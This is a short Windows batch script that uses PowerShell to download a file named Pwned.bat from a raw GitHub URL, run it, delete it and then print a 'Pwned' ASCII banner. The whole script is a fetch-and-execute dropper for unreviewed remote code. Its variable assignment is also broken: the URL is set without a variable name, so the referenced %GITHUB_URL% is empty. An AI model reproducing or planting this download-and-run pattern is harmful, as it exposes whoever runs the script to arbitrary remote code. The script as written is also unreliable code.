@echo off
setlocal enabledelayedexpansion

rem Set the URL of the raw GitHub file
set "https://raw.githubusercontent.com/0FOOTPRINT/0FOOTPRINT/refs/heads/main/Pwned.bat"

rem Download the file using PowerShell
powershell -Command "Invoke-WebRequest -Uri '%GITHUB_URL%' -OutFile 'temp_script.bat'"

rem Check if the download was successful
if exist temp_script.bat (
    echo Running the downloaded script...
    call temp_script.bat
) else (
    echo Failed to download the script.
)

rem Clean up
del temp_script.bat
endlocal


echo ===============================
echo "  ___                     _ ";
echo " | _ \__ __ ___ _  ___ __| |";
echo " |  _/\ V  V / ' \/ -_) _\` |";
echo " |_|   \_/\_/|_||_\___\__,_|";
echo "                            ";
echo ===============================
pause
